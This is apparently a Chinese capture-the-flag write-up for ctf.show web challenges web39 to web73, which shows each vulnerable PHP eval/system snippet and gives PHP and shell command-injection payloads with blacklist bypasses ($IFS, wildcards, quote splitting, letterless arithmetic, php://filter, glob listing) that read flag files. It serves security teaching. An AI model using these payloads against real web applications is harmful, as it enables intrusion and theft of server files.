include($c.&quot;.php&quot;); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 此题过滤了 flag ,然后限制了后缀不能为 php,但是使用 data:// 协议不受过滤的影响 实验： 1. 仍然使用 data:// 协议； ls 查看目录 1?c=data://text/plain,&lt;?php system(&quot;ls&quot;);?&gt; ​ 12// cat 所有 f开头的文件?c=data://text/plain,&lt;?php system(&quot;cat f*&quot;);?&gt; ​ web40源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-04 00:12:34# @Last Modified by: h1xa# @Last Modified time: 2020-09-04 06:03:36# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c = $_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\（|\\）|\\-|\\=|\\+|\\&#123;|\\[|\\]|\\&#125;|\\:|\\&#x27;|\\&quot;|\\,|\\&lt;|\\.|\\&gt;|\\/|\\?|\\\\\\\\/i&quot;, $c))&#123; eval($c); &#125; &#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 过滤了 [0-9]数字，~，·，@, #, $, ^, &amp;, *, 中文括号（），-, =, +, {},[], : , ’ , “, 逗号, &lt; &gt;, 小数点, ./, ? ,一大堆 ​ 根据提示给出 payload 是使用无参数函数进行文件读取 实验： 12?c=print_r(localeconv());//localeconv() 返回包含本地数字及货币格式信息的数组其中包含小数点，正好题目过滤了小数点 12?c=print_r(pos(localeconv()));// pos() 获取数组中当前元素的值---&gt; 12?c=print_r(scandir(pos(localeconv())));// scandir() 返回指定目录中的文件和目录的数组---&gt; 此时获取到的数组下标为 1 的为 .. 12?c=print_r(array_reverse(scandir(pos(localeconv()))));// array_reverse() 翻转数组--&gt;将 scandir() 获取到的数组下标 1 的变为 flag.php 12?c=print_r(next(array_reverse(scandir(pos(localeconv())))));// next() 函数将内部指针指向数组中的下一个元素，并输出。即下一个 ———&gt; flag.php；如若在上一步 array_reverse() 不翻转将得到： .. 此时已经读取到了 flag.php 那么就要将其内容显示出来： 可以使用 show_source() 或者 highlight_file() 得到flag 12?c=show_source(next(array_reverse(scandir(pos(localeconv())))));?c=highlight_file(next(array_reverse(scandir(pos(localeconv()))))); flag: web41web42 — &gt;/dev/null 2&gt;&amp;1源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 20:51:55# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： /dev/null /dev/null 表示的是一个黑洞，通常用于丢弃不需要的数据输出，或者用于输入流的文件 /dev/null 作用是将标准输出重定向到 /dev/null 中。 /dev/null 代表Linux的空设备文件，往这个文件里面写入的内容都会丢失:”黑洞” 所以执行了 &gt;dev/null 之后，标准输出掉入黑洞不复存在。 2&gt;&amp;1 重定向绑定，&amp;可以将两个输出绑定在一起。所以错误输出将和标准输出同一个文件描述。 一次 &gt;/dev/null 2&gt;&amp;1 执行后：标准输出重定向到/dev/null(黑洞)中,错误输出重用来标准输出的描述，因此也掉入了黑洞。综上所述，该条命令执行后，不会有任何显示，不会输出任何信息到控制台，也不会有任何信息输出到文件中。 所以此题要把 &gt;/dev/null 2&gt;&amp;1 这部分内容截断: 12345?c=cat flag.php; // cat可以替换为 tac，nl,more，less，uniq，tail,下面的几个 flag 同样适用?c=cat flag.php%0a // %0a = 回车?c=cat flag.php%26 // %26 = &amp;?c=cat flag.php%26%26 // %26%26 = &amp;&amp;?c=cat flag.php|| // || = || flag: web43源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:32:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 此题较上题，多过滤了分号(;)和cat，所以在构建payload的时候，可以不使用分号(;),cat可以使用ca’’t，或者不适用cat 实验： ​ payload： 1234?c=tac flag.phh%0a //%0a = 回车?c=tac flag.phh%26 // %26 = &amp;?c=tac flag.php|| // || = ||// 题中的 tac 还可以替换为less,more,c&#x27;&#x27;at,nl,uniq flag: web44源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:32:01# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/;|cat|flag/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 此题在上一题的基础上多过滤了一个 flag，因此，在构建payload的时候，flag可以使用 f?ag.php ，fl’’ag.php 或 f* 代替 实验： ​ payload： 123?c=tac fl&#x27;&#x27;ag.php|| //tac 可以替换为more less nl uniq c&#x27;&#x27;at flag 可以替换为 **f?ag.php** ，**fl&#x27;&#x27;ag.php** 或 **f*** ?c=more fl&#x27;&#x27;ag.php%26 // %26 = &amp;?c=more fl&#x27;&#x27;ag.php%0a // %0a = 回车 flag: web45源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:35:34# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| /i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 在上题的基础上过了一个空格 ​ 空格的代替姿势在 web31 中讲过，有需要的可以翻看 ​ cat 和 flag 的过滤同样可以使用上一题的方法 实验： ​ payload： 1234?c=tac&lt;fl&#x27;&#x27;ag.php||?c=more$IFS$1f???.php%0a?c=less%09f*%26?c=uniq$&#123;IFS&#125;f?ag.php%26%26 flag: web46源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:50:19# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： 在上题的基础上，多过滤了数字(0-9),$,* ,也就意味着我们在绕过空格的时候没办法使用${IFS}，$IFS$1和${IFS，绕过flag 的时候不能使用 f*，其他都是和之前一样的 实验： ​ payload： 123?c=tac&lt;fl&#x27;&#x27;ag.php||?c=more%09fl&#x27;&#x27;ag.php%26?c=less&lt;&gt;fl&#x27;&#x27;ag.php%0a web47源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 21:59:23# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： 这题在上一题的基础上，多过滤了 more，less，head，sort，tail ，却没过滤 tac，nl，uniq 实验： ​ payload 123?c=uniq&lt;fl&#x27;&#x27;ag.php||?c=tac&lt;&gt;fl&#x27;&#x27;ag.php%0a?c=nl%09fl&#x27;&#x27;ag.php%26 flag: web48源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:06:20# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 在上题的基础上，过滤更多了 cut，tail，sed，awk，strings，curl，od，`，head 发现还是没过滤tac，nl和uniq，所以继续使用上一题的payload 实验： ​ payload： 123?c=uniq&lt;fl&#x27;&#x27;ag.php||?c=tac&lt;&gt;fl&#x27;&#x27;ag.php%0a?c=nl%09fl&#x27;&#x27;ag.php%26 flag: web49源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:22:43# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这题在上题的基础上又过滤了百分号(%) ，其他也没过滤，同样使用之前的方法 实验： ​ payload： 123?c=uniq&lt;fl&#x27;&#x27;ag.php||?c=tac&lt;&gt;fl&#x27;&#x27;ag.php%0a?c=nl%09fl&#x27;&#x27;ag.php%26 flag: web50源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:32:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 在上题的基础上多过滤了x26：十六进制26，x09：十六进制09 ,即过滤了 %09:tab, %26:&amp; 实验： ​ payload： 123?c=tac%09fl&#x27;&#x27;ag.php||?c=nl&lt;fl&#x27;&#x27;ag.php%26?c=uniq&lt;&gt;fl&#x27;&#x27;ag.php%0a flag: web51源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:42:52# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 此题在上题的基础上多过滤了 cat ，但是没有过滤nl 和 uniq 实验： ​ payload： 123?c=t&#x27;&#x27;ac&lt;&gt;fl&#x27;&#x27;ag.php||?c=nl&lt;fl&#x27;&#x27;ag.php%0a?c=uniq&lt;&gt;fl&#x27;&#x27;ag.php|| flag: web52源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-05 22:50:30# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 在上题的基础上多过滤了 &lt; 和 &gt; 然后解除了对 $ 的过滤 实验： ​ payload： 123?c=t&#x27;&#x27;ac$&#123;IFS&#125;fl&#x27;&#x27;ag.php||?c=nl$IFSfl&#x27;&#x27;ag.php%0a?c=uniq$&#123;IFSfl&#x27;&#x27;ag.php|| 发现 $flag=”flag_here” 并不是真正的flag; 扫描目录： 1?c=ls$&#123;IFS&#125;%0a // || 扫描目录没发现有用信息；再扫描根目录试试 1?c=ls$&#123;IFS&#125;/%0a 扫描根目录发现了一个 flag 文件，试着访问 123?c=t&#x27;&#x27;ac$&#123;IFS&#125;/fl&#x27;&#x27;ag%0a?c=nl$IFS/fl&#x27;&#x27;ag||?c=uniq$&#123;IFS&#125;/fl&#x27;&#x27;ag|| 访问后发现了flag web53源码： 1234567891011121314151617181920212223242526&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 18:21:02# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; echo($c); $d = system($c); echo &quot;&lt;br&gt;&quot;.$d; &#125;else&#123; echo &#x27;no&#x27;; &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 此题较上题多过滤了 wegt; 而且没有了“黑洞”： &gt;/dev/null 2&gt;&amp;1 123?c=ta&#x27;&#x27;c$&#123;IFS&#125;fl&#x27;&#x27;ag.php?c=nl$IFSfl&#x27;&#x27;ag.php?c=uniq$&#123;IFS&#125;fl&#x27;&#x27;ag.php flag: web54源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 19:43:42# @email: h1xa@ctfer.com# @link: https://ctfer.com*/if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 过滤的就比较离谱 实验： ​ 方法一 1234// flag.php = 8 位，?????????c=/bin/?at$&#123;IFS&#125;f?????????c=/bin/?at$&#123;IFS&#125;?????????c=/bin/?ore$&#123;IFS&#125;f??????? bin为binary:主要是系统的：cat，cp，chmod，dmesg，gzip，kill，ls，mkdir，more，mount，su，tar等等 ​ 方法二 123// 使用 mv 命令将 flag.php 重命名为 a.txt?c=mv$&#123;IFS&#125;fl?g.php$&#123;IFS&#125;a.txt?c=ls ​ 查看a.txt web55 — 无字母数字源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 20:03:51# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 过滤了分号，字母[a-z]，反引号(`)，十六进制09(x09)，十六进制26(x26)，&gt;，&lt; ；但是还保留了数字 ​ 所以解题方法就会有很多种 实验： ​ 方法一 1使用 base64 进行匹配 可以匹配到/bin目录下的命令 1cat、cp、chmod、df、dmesg、gzip、kill、ls、mkdir、more、mount、rm、su、tar、base64等 我们知道了 base64 ,现在就可以使用通配符进行匹配命令执行查看 flag 了 12?c=/???/????64 ????.???意思/bin/base64 flag.php ​ ​ 方法二 1使用 bzip2 命令 思路是，将flag文件进行压缩，然后再访问下载 /usr/bin目录下主要放置一些应用软件工具必备的执行档 1c++、g++、gcc、chdrv、diff、dig、du、eject、elm、free、gnome、 zip、htpasswd、kfm、ktop、last、less、locale、m4、make、man、mcopy、ncftp、 newaliases、nslookup passwd、quota、smb、wget等 其中，我们可以利用/usr/bin下的bzip2 12?c=/???/???/????2 ????.???/usr/bin/bzip2 flag.php 访问 flag.php.bz2 ,并下载，打开后得到flag ​ 方法三 1运用.(进行)执行sh命令 在这之前我们要上传post文件数据包 编写一个简单的上传页面： 12345678910111213141516&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt; &lt;meta charset=&quot;UTF-8&quot;&gt; &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt; &lt;title&gt;POST数据包POC&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;form action=&quot;http://ae82ef6f-deed-491d-bebf-7498e32cc9b1.challenge.ctf.show:8080/&quot; method=&quot;post&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;!--链接是当前打开的题目链接--&gt; &lt;label for=&quot;file&quot;&gt;文件名：&lt;/label&gt; &lt;input type=&quot;file&quot; name=&quot;file&quot; id=&quot;file&quot;&gt;&lt;br&gt; &lt;input type=&quot;submit&quot; name=&quot;submit&quot; value=&quot;提交&quot;&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt; 上传一个 1.txt(自己随便上传一个即可) 文件其内容为： b 使用bp抓包： 123?c=.%20/???/????????[@-[]//意思/tmp/flag.php[2-[]//[@-[] 从 @ 到 [ : @，26个大写字母， [ ,所有表示 匹配大写字母 访问 flag web56源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\\\$|\\(|\\&#123;|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\&gt;|\\&lt;/i&quot;, $c))&#123; system($c); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; ​ 此题较上题(web55)多过滤了 数字[0-1], $,(,{,’,” ​ 所以方法使用上题的方法三 web57源码： 12345678910111213141516171819202122&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-08 01:02:56# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 还能炫的动吗？//flag in 36.phpif(isset($_GET[&#x27;c&#x27;]))&#123; $c=$_GET[&#x27;c&#x27;]; if(!preg_match(&quot;/\\;|[a-z]|[0-9]|\\`|\\|\\#|\\&#x27;|\\&quot;|\\`|\\%|\\x09|\\x26|\\x0a|\\&gt;|\\&lt;|\\.|\\,|\\?|\\*|\\-|\\=|\\[/i&quot;, $c))&#123; system(&quot;cat &quot;.$c.&quot;.php&quot;); &#125;&#125;else&#123; highlight_file(__FILE__);&#125; ​ 百度查了有些蒙，直接上payload 12345678910$(())输出0，数学运算~$(())输出~0$((~$(())))输出-1所以再这我们只需要让36个-1相加再取反?c=$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(()))))))) flag: web58源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 看着挺简单，直接试 system 函数，发现被禁用了 ​ 然后使用读取文件的方式，这里没有禁用文件读取 实验： ​ 方法一： 12345678910//提高亮度函数c=show_source(&quot;flag.php&quot;);c=highlight_file(&quot;flag.php&quot;);//读取文件c=echo file_get_contents(&quot;flag.php&quot;);c=readfile(&quot;flag.php&quot;);c=var_dump(file(&quot;flag.php&quot;));c=print_r(file(&quot;flag.php&quot;));c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while(!feof($a))&#123;$line = fgets($a);echo $line;&#125; ​ 还有个方法二会在 web62 中介绍 .flag: web59源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 这道题的源码没变。但是引用的函数肯定试越来越多的 ​ 这道题可以直接使用 include 函数，然后进行文件读取 123?a=php://filter/convert.base64-encode/resource=flag.php// post中c=include($_GET[a]); ​ 也可以继续使用上一题的方法 12345678//提亮函数c=show_source(&quot;flag.php&quot;);c=highlight_file(&quot;flag.php&quot;);// 读取文件c=var_dump(file(&quot;flag.php&quot;));c=print_r(file(&quot;flag.php&quot;));c=$a=fopen(&quot;flag.php&quot;,&quot;r&quot;);while (!feof($a)) &#123;$line = fgets($a);echo $line;&#125; web60源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 源码没变，但是引用的函数过了，之前的方法也只有两个可以继续使用，直接行payload 123//提亮函数c=show_source(&quot;flag.php&quot;);c=highlight_file(&quot;flag.php&quot;); ​ 也可以使用 include 函数，然后进行文件读取 123?a=php://filter/convert.base64-encode/resource=flag.php// post：c=include($_GET[a]); web61使用上一题的方法 web62源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 源码一样，可以使用之前的方法；这里使用一个在 web40 中使用的方法 1c=var_dump(scandir(&#x27;/&#x27;)); 扫描当前目录 12c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));c=show_source(array_rand(array_flip(scandir(pos(localeconv()))))); web63​ 同上 web64​ 同上 web65​ 同上 web66源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 源码还是那个源码，继续使用之前的方法 实验： ​ 使用 show_source() 发现被禁用了 ​ 继续使用高亮函数(highlight_file)查看，发现 flag 不在这 ​ 下面直接查看根目录 1c=print_r(scandir(&quot;/&quot;)); 发现了 flag.txt 文件 查看 flag.txt 文件 1c=highlight_file(&quot;/flag.txt&quot;); flag: web67源码： 1234567891011121314151617181920&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c);&#125;else&#123; highlight_file(__FILE__);&#125; 分析： ​ 源码还是那个源码，解题方法也和上题相似 实验： ​ 直接显示 flag 还是没有东西，所以还得查看目录寻找flag 12POST:c=print_r(scandir(&quot;/&quot;)); ​ 发现 print_r 被禁了，可以使用 var_dump 1c=var_dump(scandir(&quot;/&quot;)); 找到 flag.txt 文件，现在就是访问 1c=highlight_file(&quot;/flag.txt&quot;); web68源码： ​ 好吧，没源码，这题无法显示源码,应该是显示的函数被禁用了 分析: ​ 除了不显示源码外，我们继续尝试用上一题的方法 实验： ​ 首先查看目录 1c=var_dump(scandir(&quot;/&quot;)); ​ 查看到 flag.txt ,现在就是访问了 1c=highlight_file(&quot;/flag.txt&quot;); ​ 也该想到这函数被禁用了，毕竟源码都不能显示 ​ 查看官方给出的提示，发现使用 ”include“ 12c=include(&quot;/flag.txt&quot;);c=require_once(&quot;/flag.txt&quot;); flag: web69​ 同web68 web70​ 同web68 web71附件中给出的源码： 1234567891011121314151617181920212223242526272829&lt;?php/*# -*- coding: utf-8 -*-# @Author: Lazzaro# @Date: 2020-09-05 20:49:30# @Last Modified by: h1xa# @Last Modified time: 2020-09-07 22:02:47# @email: h1xa@ctfer.com# @link: https://ctfer.com*/error_reporting(0);ini_set(&#x27;display_errors&#x27;, 0);// 你们在炫技吗？if(isset($_POST[&#x27;c&#x27;]))&#123; $c= $_POST[&#x27;c&#x27;]; eval($c); $s = ob_get_contents(); ob_end_clean(); echo preg_replace(&quot;/[0-9]|[a-z]/i&quot;,&quot;?&quot;,$s);&#125;else&#123; highlight_file(__FILE__);&#125;?&gt;你要上天吗？ 1234// ob_get_contentx() 返回输出缓冲区的内容// ob_start() 打开输出控制缓冲// ob_end_clean() 清空（擦除）缓冲区并关闭输出缓冲// 把 数字字母 都替换为了 &#x27;?&#x27; 此题首先 执行 : eval($c),将获取到了$c执行一遍，然后 $s = bo_get_contents();将$c执行的内容由缓存读取到了变量 $s,接下来的 preg_replace()会将缓存中的所有内容替换为‘?’:因此我们将会看到如下： 1c=var_export(scandir(&quot;/&quot;)); 扫描目录出来的内容都变成了 ?????? and 你要上天吗? ，因此为了不让 ? 执行，可以在eval($c)执行完毕后将整个php程序给结束不再执行后面的语句，就可以实现绕过字母数字的替换； 12c=var_export(scandir(&#x27;/&#x27;));die();c=var_export(scandir(&#x27;/&#x27;));exit(); 如图找到了 flag.txt 和上面几道题的位置一样: 12c=include(&#x27;/flag.txt&#x27;);exit();c=include(&#x27;/flag.txt&#x27;);die(); web72​ 不太会 web73分析： ​ 根据提示，可以利用 glob:///* 扫描根目录下文件 123456789c=?&gt;&lt;?php $a=new DirectoryIterator(&quot;glob:///*&quot;);foreach($a as $f)&#123;echo($f-&gt;__toString().&#x27; &#x27;);&#125;exit(0);?&gt;// 前面的?&gt;用来闭合&lt;?// php使用glob遍历文件夹 ​ 这个方法采用了数组遍历，输出根目录下的所有的文件 ​ 查看到 flag 在 flagc.txt 文件中 ​ payload: 12?c=include(&quot;/flagc.txt&quot;);exit(); web73​ 